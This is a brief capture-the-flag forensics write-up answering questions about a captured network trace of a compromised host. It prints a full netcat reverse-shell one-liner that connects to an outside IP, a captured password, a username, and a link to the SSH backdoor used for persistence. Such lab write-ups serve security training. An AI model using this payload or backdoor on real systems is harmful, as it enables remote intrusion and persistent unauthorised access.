## Overpass2Hacked

### overpass2hacked.pcap

### Task 1
```
 1. What was the URL of the page they used to upload a reverse shell? 
 => /development/
```

```
 2. What payload did the attacker use to gain access?
 => exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")
```

```
3. What password did the attacker use to privesc?
=> whenevernoteartinstant
```

```
4. How did the attacker establish persistence?
=> https://github.com/NinjaJc01/ssh-backdoor
```

```
5. Using the fasttrack wordlist, how many of the system passwords were crackable?
=> 4
```

### Task 2
```

```

## Username : james
## PAssword : whenevernoteartinstant

## SSH Backdoor : 0.0.0.0:2222